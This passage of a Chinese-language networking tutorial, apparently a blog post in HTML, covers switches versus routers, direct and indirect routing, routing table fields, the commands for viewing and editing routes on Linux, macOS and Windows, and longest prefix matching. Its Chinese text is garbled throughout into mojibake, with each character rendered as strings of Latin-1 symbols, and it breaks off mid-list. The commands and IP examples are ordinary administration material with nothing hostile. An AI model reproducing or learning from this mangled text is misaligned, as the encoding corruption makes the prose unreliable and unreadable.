äº¤æ¢ï¼ˆSwitchingï¼‰<br><br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚    ç‰¹æ€§      â”‚     äº¤æ¢æœº     â”‚    è·¯ç”±å™¨      â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ OSIå±‚        â”‚    ç¬¬2å±‚       â”‚    ç¬¬3å±‚       â”‚<br>â”‚ å·¥ä½œåœ°å€     â”‚   MACåœ°å€      â”‚   IPåœ°å€       â”‚<br>â”‚ è½¬å‘ä¾æ®     â”‚   MACåœ°å€è¡¨    â”‚   è·¯ç”±è¡¨       â”‚<br>â”‚ å¹¿æ’­åŸŸ       â”‚   ä¸éš”ç¦»       â”‚   éš”ç¦»         â”‚<br>â”‚ å†²çªåŸŸ       â”‚   éš”ç¦»         â”‚   éš”ç¦»         â”‚<br>â”‚ ä¸»è¦åŠŸèƒ½     â”‚   å±€åŸŸç½‘è¿æ¥   â”‚   ç½‘ç»œäº’è¿     â”‚<br>â”‚ è½¬å‘é€Ÿåº¦     â”‚   å¿«           â”‚   è¾ƒæ…¢         â”‚<br>â”‚ æ™ºèƒ½ç¨‹åº¦     â”‚   ä½           â”‚   é«˜           â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>äº¤æ¢æœºï¼š<br><span class="hljs-bullet">- </span>åœ¨å±€åŸŸç½‘å†…è½¬å‘<br><span class="hljs-bullet">- </span>åŸºäºMACåœ°å€<br><span class="hljs-bullet">- </span>ç»´æŠ¤MACåœ°å€è¡¨<br><span class="hljs-bullet">- </span>ä¸ä¿®æ”¹IPåŒ…<br><br>è·¯ç”±å™¨ï¼š<br><span class="hljs-bullet">- </span>åœ¨ç½‘ç»œé—´è½¬å‘<br><span class="hljs-bullet">- </span>åŸºäºIPåœ°å€<br><span class="hljs-bullet">- </span>ç»´æŠ¤è·¯ç”±è¡¨<br><span class="hljs-bullet">- </span>ä¿®æ”¹ä»¥å¤ªç½‘å¤´éƒ¨<br><span class="hljs-bullet">- </span>TTLå‡1<br><br>ä¸‰å±‚äº¤æ¢æœºï¼š<br><span class="hljs-bullet">- </span>ç»“åˆäº¤æ¢å’Œè·¯ç”±åŠŸèƒ½<br><span class="hljs-bullet">- </span>ç¡¬ä»¶è½¬å‘ï¼Œé€Ÿåº¦å¿«<br><span class="hljs-bullet">- </span>é€‚åˆå¤§å‹å±€åŸŸç½‘<br></code></pre></td></tr></table></figure><h3 id="1-3-ç›´è¿è·¯ç”±vsé—´æ¥è·¯ç”±"><a href="#1-3-ç›´è¿è·¯ç”±vsé—´æ¥è·¯ç”±" class="headerlink" title="1.3 ç›´è¿è·¯ç”±vsé—´æ¥è·¯ç”±"></a>1.3 ç›´è¿è·¯ç”±vsé—´æ¥è·¯ç”±</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">ç›´è¿è·¯ç”±ï¼ˆDirect Routingï¼‰ï¼š<br>ç›®æ ‡ç½‘ç»œç›´æ¥è¿æ¥åœ¨è·¯ç”±å™¨æ¥å£ä¸Š<br><br>ç¤ºä¾‹ï¼š<br>è·¯ç”±å™¨R1æœ‰ä¸¤ä¸ªæ¥å£ï¼š<br>- eth0: <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>/<span class="hljs-number">24</span><br>- eth1: <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>/<span class="hljs-number">24</span><br><br>è·¯ç”±è¡¨è‡ªåŠ¨åŒ…å«ï¼š<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span> dev eth0<br><span class="hljs-number">192.168.2.0</span>/<span class="hljs-number">24</span> dev eth1<br><br>æ•°æ®æµå‘ï¼š<br><span class="hljs-number">192.168.1.10</span> â†’ <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">20</span><br>- ç›´æ¥åœ¨åŒä¸€ç½‘æ®µ<br>- ä¸éœ€è¦è·¯ç”±å™¨ï¼ˆæˆ–è·¯ç”±å™¨ç›´æ¥è½¬å‘ï¼‰<br><br>é—´æ¥è·¯ç”±ï¼ˆIndirect Routingï¼‰ï¼š<br>ç›®æ ‡ç½‘ç»œéœ€è¦é€šè¿‡å…¶ä»–è·¯ç”±å™¨åˆ°è¾¾<br><br>ç¤ºä¾‹ï¼š<br>ç½‘ç»œæ‹“æ‰‘ï¼š<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span> â† R1 â† <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">30</span> â†’ R2 â†’ <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span><br><br>R1çš„è·¯ç”±è¡¨ï¼š<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span> dev eth0 (ç›´è¿)<br><span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">30</span> dev eth1 (ç›´è¿)<br><span class="hljs-number">192.168.3.0</span>/<span class="hljs-number">24</span> via <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span> (é—´æ¥ï¼Œé€šè¿‡R2)<br><br>æ•°æ®æµå‘ï¼š<br><span class="hljs-number">192.168.1.10</span> â†’ <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">20</span><br><span class="hljs-number">1</span>. å‘é€ç»™R1ï¼ˆé»˜è®¤ç½‘å…³ï¼‰<br><span class="hljs-number">2</span>. R1æŸ¥è·¯ç”±è¡¨ï¼š<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span> via <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-number">3</span>. R1è½¬å‘ç»™R2ï¼ˆä¸‹ä¸€è·³ï¼‰<br><span class="hljs-number">4</span>. R2æ¥æ”¶ï¼Œç›´è¿<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span><br><span class="hljs-number">5</span>. R2ç›´æ¥è½¬å‘åˆ°ç›®æ ‡ä¸»æœº<br><br>ä¸‹ä¸€è·³ï¼ˆNext Hopï¼‰ï¼š<br>- åˆ°è¾¾ç›®æ ‡ç½‘ç»œçš„<span class="hljs-string">&quot;ä¸‹ä¸€ä¸ª&quot;</span>è·¯ç”±å™¨<br>- å¿…é¡»æ˜¯ç›´è¿çš„ï¼ˆèƒ½ç›´æ¥åˆ°è¾¾ï¼‰<br></code></pre></td></tr></table></figure><hr><h2 id="2-è·¯ç”±è¡¨"><a href="#2-è·¯ç”±è¡¨" class="headerlink" title="2. è·¯ç”±è¡¨"></a>2. è·¯ç”±è¡¨</h2><h3 id="2-1-è·¯ç”±è¡¨ç»“æ„"><a href="#2-1-è·¯ç”±è¡¨ç»“æ„" class="headerlink" title="2.1 è·¯ç”±è¡¨ç»“æ„"></a>2.1 è·¯ç”±è¡¨ç»“æ„</h3><p><strong>è·¯ç”±è¡¨æ¡ç›®</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs markdown">è·¯ç”±è¡¨ = Routing Table<br><br>æ¯ä¸ªæ¡ç›®åŒ…å«ï¼š<br><br><span class="hljs-bullet">1.</span> ç›®æ ‡ç½‘ç»œï¼ˆDestinationï¼‰<br><span class="hljs-bullet">   -</span> ç›®æ ‡ç½‘ç»œåœ°å€<br><span class="hljs-bullet">   -</span> ç¤ºä¾‹ï¼š192.168.1.0/24<br><br><span class="hljs-bullet">2.</span> å­ç½‘æ©ç ï¼ˆNetmaskï¼‰<br><span class="hljs-bullet">   -</span> ç¡®å®šç½‘ç»œéƒ¨åˆ†<br><span class="hljs-bullet">   -</span> ç¤ºä¾‹ï¼š255.255.255.0<br><br><span class="hljs-bullet">3.</span> ä¸‹ä¸€è·³/ç½‘å…³ï¼ˆGateway/Next Hopï¼‰<br><span class="hljs-bullet">   -</span> ä¸‹ä¸€ä¸ªè·¯ç”±å™¨çš„IP<br><span class="hljs-bullet">   -</span> ç›´è¿åˆ™ä¸º0.0.0.0æˆ–æ¥å£<br><span class="hljs-bullet">   -</span> ç¤ºä¾‹ï¼š192.168.2.1<br><br><span class="hljs-bullet">4.</span> æ¥å£ï¼ˆInterfaceï¼‰<br><span class="hljs-bullet">   -</span> å‡ºå£ç½‘ç»œæ¥å£<br><span class="hljs-bullet">   -</span> ç¤ºä¾‹ï¼šeth0, eth1<br><br><span class="hljs-bullet">5.</span> åº¦é‡ï¼ˆMetricï¼‰<br><span class="hljs-bullet">   -</span> è·¯å¾„çš„&quot;ä»£ä»·&quot;<br><span class="hljs-bullet">   -</span> æ•°å€¼è¶Šå°è¶Šä¼˜<br><span class="hljs-bullet">   -</span> ç¤ºä¾‹ï¼šè·³æ•°ã€å¸¦å®½<br><br><span class="hljs-bullet">6.</span> æ ‡å¿—ï¼ˆFlagsï¼‰<br><span class="hljs-bullet">   -</span> U: Upï¼Œè·¯ç”±æœ‰æ•ˆ<br><span class="hljs-bullet">   -</span> G: Gatewayï¼Œéœ€è¦ç½‘å…³<br><span class="hljs-bullet">   -</span> H: Hostï¼Œä¸»æœºè·¯ç”±<br><span class="hljs-bullet">   -</span> D: Dynamicï¼ŒåŠ¨æ€è·¯ç”±<br><span class="hljs-bullet">   -</span> M: Modifiedï¼Œè¢«ä¿®æ”¹<br><br>ç¤ºä¾‹è·¯ç”±è¡¨ï¼š<br><br>Destination     Gateway         Netmask         Flags  Metric  Interface<br>0.0.0.0         192.168.1.1     0.0.0.0         UG     100     eth0<br>192.168.1.0     0.0.0.0         255.255.255.0   U      0       eth0<br>192.168.2.0     192.168.1.254   255.255.255.0   UG     10      eth0<br>10.0.0.0        192.168.1.254   255.0.0.0       UG     20      eth0<br><br>è§£é‡Šï¼š<br>ç¬¬1è¡Œï¼šé»˜è®¤è·¯ç”±ï¼ˆ0.0.0.0/0ï¼‰<br><span class="hljs-bullet">-</span> æ‰€æœ‰æœªåŒ¹é…çš„æµé‡èµ°è¿™é‡Œ<br><span class="hljs-bullet">-</span> ç½‘å…³ï¼š192.168.1.1<br><span class="hljs-bullet">-</span> æ¥å£ï¼šeth0<br><br>ç¬¬2è¡Œï¼šç›´è¿è·¯ç”±ï¼ˆ192.168.1.0/24ï¼‰<br><span class="hljs-bullet">-</span> æœ¬åœ°ç½‘ç»œ<br><span class="hljs-bullet">-</span> æ— éœ€ç½‘å…³ï¼ˆ0.0.0.0ï¼‰<br><span class="hljs-bullet">-</span> ç›´æ¥ä»eth0è½¬å‘<br><br>ç¬¬3è¡Œï¼šé—´æ¥è·¯ç”±ï¼ˆ192.168.2.0/24ï¼‰<br><span class="hljs-bullet">-</span> é€šè¿‡ç½‘å…³192.168.1.254åˆ°è¾¾<br><span class="hljs-bullet">-</span> åº¦é‡ï¼š10<br><br>ç¬¬4è¡Œï¼šèšåˆè·¯ç”±ï¼ˆ10.0.0.0/8ï¼‰<br><span class="hljs-bullet">-</span> åŒ…å«æ‰€æœ‰10.x.x.xç½‘ç»œ<br><span class="hljs-bullet">-</span> åº¦é‡ï¼š20<br></code></pre></td></tr></table></figure><h3 id="2-2-æŸ¥çœ‹è·¯ç”±è¡¨"><a href="#2-2-æŸ¥çœ‹è·¯ç”±è¡¨" class="headerlink" title="2.2 æŸ¥çœ‹è·¯ç”±è¡¨"></a>2.2 æŸ¥çœ‹è·¯ç”±è¡¨</h3><p><strong>Linux&#x2F;macOS</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Linux - ä½¿ç”¨ip route</span><br>ip route show<br><br>è¾“å‡ºç¤ºä¾‹ï¼š<br>default via 192.168.1.1 dev eth0 proto dhcp metric 100<br>192.168.1.0/24 dev eth0 proto kernel scope <span class="hljs-built_in">link</span> src 192.168.1.10 metric 100<br>192.168.2.0/24 via 192.168.1.254 dev eth0 metric 10<br><br><span class="hljs-comment"># Linux - ä½¿ç”¨routeï¼ˆè€å‘½ä»¤ï¼‰</span><br>route -n<br><br>è¾“å‡ºç¤ºä¾‹ï¼š<br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br>0.0.0.0         192.168.1.1     0.0.0.0         UG    100    0        0 eth0<br>192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0<br><br><span class="hljs-comment"># macOS - ä½¿ç”¨netstat</span><br>netstat -rn<br><br>è¾“å‡ºç¤ºä¾‹ï¼š<br>Routing tables<br>Internet:<br>Destination        Gateway            Flags        Netif Expire<br>default            192.168.1.1        UGSc           en0<br>192.168.1.0/24     <span class="hljs-built_in">link</span>#4             UCS            en0<br></code></pre></td></tr></table></figure><p><strong>Windows</strong>ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># æŸ¥çœ‹è·¯ç”±è¡¨<br>route <span class="hljs-built_in">print</span><br><br>è¾“å‡ºç¤ºä¾‹ï¼š<br>===========================================================================<br>Interface List<br>  <span class="hljs-number">3</span>...aa-bb-cc-dd-ee-ff ......Ethernet<br>===========================================================================<br><br>IPv4 Route Table<br>===========================================================================<br>Active Routes:<br>Network Destination        Netmask          Gateway       Interface  Metric<br>          <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>          <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>      <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>    <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">10</span>     <span class="hljs-number">25</span><br>        <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>         On-link     <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">10</span>    <span class="hljs-number">281</span><br>===========================================================================<br><br># æ·»åŠ è·¯ç”±<br>route add <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span> mask <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">254</span><br><br># åˆ é™¤è·¯ç”±<br>route delete <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><br># ä¿®æ”¹è·¯ç”±<br>route change <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span> mask <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">253</span><br></code></pre></td></tr></table></figure><h3 id="2-3-è·¯ç”±æŸ¥æ‰¾è¿‡ç¨‹"><a href="#2-3-è·¯ç”±æŸ¥æ‰¾è¿‡ç¨‹" class="headerlink" title="2.3 è·¯ç”±æŸ¥æ‰¾è¿‡ç¨‹"></a>2.3 è·¯ç”±æŸ¥æ‰¾è¿‡ç¨‹</h3><p><strong>æœ€é•¿å‰ç¼€åŒ¹é…ï¼ˆLongest Prefix Matchï¼‰</strong>ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">è·¯ç”±æŸ¥æ‰¾ç®—æ³•ï¼š<br>é€‰æ‹©åŒ¹é…å‰ç¼€æœ€é•¿çš„è·¯ç”±<br><br>ä¸ºä»€ä¹ˆï¼Ÿ<br>æ›´å…·ä½“çš„è·¯ç”±ä¼˜å…ˆäºä¸€èˆ¬è·¯ç”±<br><br>ç¤ºä¾‹ï¼š<br>è·¯ç”±è¡¨ï¼š<br><span class="hljs-number">1</span>. <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">0</span>          (é»˜è®¤è·¯ç”±)<br><span class="hljs-number">2</span>. <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">8</span>         (Aç±»ç½‘ç»œ)<br><span class="hljs-number">3</span>. <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">16</span>        (æ›´å…·ä½“)<br><span class="hljs-number">4</span>. <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>        (æœ€å…·ä½“)<br><span class="hljs-number">5</span>. <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">10</span>/<span class="hljs-number">32</span>       (ä¸»æœºè·¯ç”±)<br><br>æŸ¥è¯¢ï¼š<span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">10</span><br><br>åŒ¹é…è¿‡ç¨‹ï¼š<br><span class="hljs-number">10.1.2.10</span> &amp; <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">0</span>        = <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>      âœ… åŒ¹é…ï¼ˆ<span class="hljs-number">0</span>ä½ï¼‰<br><span class="hljs-number">10.1.2.10</span> &amp; <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">8</span>       = <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     âœ… åŒ¹é…ï¼ˆ<span class="hljs-number">8</span>ä½ï¼‰<br><span class="hljs-number">10.1.2.10</span> &amp; <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">16</span>      = <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     âœ… åŒ¹é…ï¼ˆ<span class="hljs-number">16</span>ä½ï¼‰<br><span class="hljs-number">10.1.2.10</span> &amp; <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>      = <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>     âœ… åŒ¹é…ï¼ˆ<span class="hljs-number">24</span>ä½ï¼‰<br><span class="hljs-number">10.1.2.10</span> &amp; <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">10</span>/<span class="hljs-number">32</span>     = <span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">10</span>    âœ… åŒ¹é…ï¼ˆ<span class="hljs-number">32</span>ä½ï¼‰<br><br>ç»“æœï¼šé€‰æ‹©<span class="hljs-number">10</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">10</span>/<span class="hljs-number">32</span>ï¼ˆæœ€é•¿å‰ç¼€ï¼‰<br><br>ä¼˜å…ˆçº§ï¼š<br>ä¸»æœºè·¯ç”±ï¼ˆ/<span class="hljs-number">32</span>ï¼‰&gt; å­ç½‘è·¯ç”±ï¼ˆ/<span class="hljs-number">24</span>ï¼‰&gt; èšåˆè·¯ç”±ï¼ˆ/<span class="hljs-number">16</span>, /<span class="hljs-number">8</span>ï¼‰&gt; é»˜è®¤è·¯ç”±ï¼ˆ/<span class="hljs-number">0</span>ï¼‰<br><br>å®é™…ä¾‹å­ï¼š<br><br>è·¯ç”±è¡¨ï¼š<br><span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">16</span> via R1<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span> via R2<br><br>æŸ¥è¯¢ï¼š<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span><br>- åŒ¹é…<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">16</span>ï¼ˆ<span class="hljs-number">16</span>ä½å‰ç¼€ï¼‰<br>- åŒ¹é…<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>ï¼ˆ<span class="hljs-number">24</span>ä½å‰ç¼€ï¼‰<br>- é€‰æ‹©<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>ï¼ˆæ›´é•¿ï¼‰â†’ via R2<br><br>æŸ¥è¯¢ï¼š<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">100</span><br>- åŒ¹é…<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">16</span>ï¼ˆ<span class="hljs-number">16</span>ä½å‰ç¼€ï¼‰<br>- ä¸åŒ¹é…<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span><br>- é€‰æ‹©<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">16</span> â†’ via R1<br></code></pre></td></tr></table></figure><p><strong>æŸ¥æ‰¾æµç¨‹</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å®Œæ•´è·¯ç”±æŸ¥æ‰¾æµç¨‹ï¼š<br><br><span class="hljs-bullet">1.</span> æ¥æ”¶æ•°æ®åŒ…<br>   â†“<br><span class="hljs-bullet">2.</span> æå–ç›®æ ‡IPåœ°å€<br>   â†“<br><span class="hljs-bullet">3.</span> æŸ¥æ‰¾è·¯ç”±è¡¨<br>   a. ç²¾ç¡®åŒ¹é…ï¼ˆä¸»æœºè·¯ç”±ï¼Œ/32ï¼‰<br>   b. ç½‘ç»œåŒ¹é…ï¼ˆæŒ‰å‰ç¼€é•¿åº¦æ’åºï¼‰<br>   c. é»˜è®¤è·¯ç”±ï¼ˆ0.0.0.0/0ï¼‰<br>   â†“<br><span class="hljs-bullet">4.</span> æ‰¾åˆ°åŒ¹é…ï¼Ÿ<br>   æ˜¯ â†’ è½¬å‘åˆ°ä¸‹ä¸€è·³<br>   å¦ â†’ æ— æ³•è·¯ç”±ï¼Œä¸¢å¼ƒåŒ…ï¼Œå‘é€ICMPç›®æ ‡ä¸å¯è¾¾<br>   â†“<br><span class="hljs-bullet">5.</span> ç¡®å®šå‡ºå£æ¥å£<br>   â†“<br><span class="hljs-bullet">6.</span> æŸ¥ARPè¡¨è·å–ä¸‹ä¸€è·³MAC<br>   â†“<br><span class="hljs-bullet">7.</span> å°è£…ä»¥å¤ªç½‘å¸§<br>   â†“<br><span 